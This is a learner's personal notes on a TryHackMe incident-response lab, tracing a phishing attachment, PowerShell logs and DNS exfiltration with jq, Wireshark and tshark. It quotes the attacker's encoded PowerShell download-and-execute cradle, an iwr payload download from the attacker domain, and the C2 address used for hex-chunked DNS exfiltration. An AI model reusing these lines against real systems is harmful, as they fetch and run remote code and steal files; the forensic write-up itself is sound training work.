##### This version was my own and was not enhanced by AI.

#### Personal Notes and tips: sq3.exe seems to be what the attacker used against the SQLite database. --important to remember for the future
---
# Boogeyman 1 Notes:

## Email Investigation
---
Opened up the eml file

Phish Email:
agriffin@bpakcaging.xyz

Victim's Email:
julianne.westcott@hotmail.com

Looking inside the zip without extracting:
unzip -l Invoice.zip

The .zip file is password protected

Found the password within the email data:
"invoice2023!"

Used the command:

unzip -P Invoice2023! Invoice.zip

was the correct password and inflated the file within;

"Invoice_20230103.lnk"

Using lnkparse on the .lnk file reveals a command line within it

From the lnkparse command:

"Command line arguments: -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA=="

Using CyberChef, I included 'From Base64' and 'Remove null bytes', the result?

iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')

unsure what the command is, or why its there, I continue the investigation
---------------------------------

## Endpoint Investigation
---------------------------------
Found a GitHub url within the powershell.json file within the Artefacts folder.

"hxxps[://]github[.]com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Seatbelt[.]ps1"

Found another suspicious link:
"iwr hxxp[://]files[.]bpakcaging[.]xyz/sq3[.]exe -outfile sq3[.]exe;pwd"

Extracted (and defanged) Domains:
cdn[.]bpakcaging[.]xyz,files[.]bpakcaging[.]xyz

Found more:
C:\\Users\\j.westcott\\Documents\\protected_data.kdbx;pwd

Vital piece?
C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAd

Brainstorming with trial and error:
cat powershell.json | jq '{path}'
cat powershell.json | jq '{ContextInfo}'
cat powershell.json | jq '{ScriptBlockText}'

found something:

.\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\;pwd

Additional note: sq3.exe was used to view (and exfiltrate?) data in the SQLite database on the victim's computer.

used cat powershell.json | grep AppData, found plum.sqlite in the same similar path as ".\\sq3.exe AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\;pwd"

plum.sqlite

Complete Reconstructed Path:
C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite

the malicious file was using Microsoft Sticky Notes as the execution point?

the exfiltrated file was 'protected_data.kdbx'

cat powershell.json | jq '{ContextInfo, ScriptBlockText}'

The threat actor used .split to split the file into many pieces while encoding them all in hex for transmission to their C2

super helpful command: cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort | uniq -c

C2 IP: 167[.]71[.]211[.]113
C2 Domain: cdn.bpakcaging.xyz
C2 port: 8080

the Threat Actor abused the windows service 'nslookup' to transmission the data to their C2.
---
## Network Investigation
---

### Wireshark:
using the 'http contains "files.bpakcaging.xyz" we found that they were using python to host the site files site by checking Packet 42702's TCP Stream.

The attacker used HTTP POST requests for the outputs of the commands executed.

The attacker used DNS during the exfiltration activity.

The attacker used sq3.exe to find the password to the file 'protected_data.kdbx', the password was stored in the plum.sqlite file, the password being "%p9^3!lL^Mz47E2GaT^y".
---
### Tshark:

Now using Tshark to obtain whatever information the attacker stole from within the file.

Commands used:
```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name -e dns.qry.type (filtering by.. dns query type?)```
```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz"``` (see the data filtered via dns of the domain traffic of the website with '.' to get any and all subdomains in the .pcapng file)
```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' ```(gives us only the field 1 data strings)
```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" ``` (sorted "files" and "cdn" out of the command results) 
```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n'``` 
```bash tshark -r capture.pcapng -Y "dns" -T fields -e dns.qry.name | grep ".bpakcaging.xyz" | cut -f1 -d '.' | grep -v -e "files" -e "cdn" | uniq | tr -d '\\n' > output.txt``` (outputted info to a .txt file)
``bash >> ~/Desktop/answers.txt``` (append the info into a new file)

use cyberchef FROM HEX, save output as .kdbx extension
(do this in a VM or sandbox in case its malware, you never know when reconstructing files)

then use a program to view the .kdbx file and its contents for the last answer in Boogeyman 1 of TryHackMe


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣔⠒⠀⠉⠉⠢⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⣀⠠⠄⠒⠘⢿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀
⢺⣦⢻⣿⣿⣿⣿⣄⠀⠀⠀⠀⠈⢿⡿⠿⠛⠛⠐⣶⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀
⠈⢿⣧⢻⣿⣿⣿⣿⣆⣀⣠⣴⣶⣿⡄⠀⠀⠀⠀⠘⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀
⠀⠀⢿⣧⢋⠉⠀⠀⠀⠹⣿⣿⣿⣿⣿⡆⣀⣤⣤⣶⣮⠀⠀⠀⠀⠣⠀⠀⠀⠀
⠀⠀⠈⢿⣧⢂⠀⠀⠀⠀⢘⠟⠛⠉⠁⠀⠹⣿⣿⣿⣿⣷⡀⠀⠀⠀⢣⠀⠀⠀
⠀⠀⠀⠈⢿⣧⢲⣶⣾⣿⣿⣧⡀⠀⠀⠀⢀⣹⠛⠋⠉⠉⠉⢿⣿⣿⣿⣧⠀⠀
⠀⠀⠀⠀⠀⢿⣧⢻⣿⣿⣿⡿⠷⢤⣶⣿⣿⣿⣧⡀⠀⠀⠀⠈⢻⣿⣿⣿⣧⠀
⠀⠀⠀⠀⠀⠈⢿⣧⢛⠉⠁⠀⠀⠀⢻⣿⣿⣿⡿⠗⠒⠒⠈⠉⠉⠉⠙⡉⠛⡃
⠀⠀⠀⠀⠀⠀⠈⢿⣯⢂⠀⠀⠀⡀⠤⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⢿⣯⠐⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

# ===FINISH CTF===

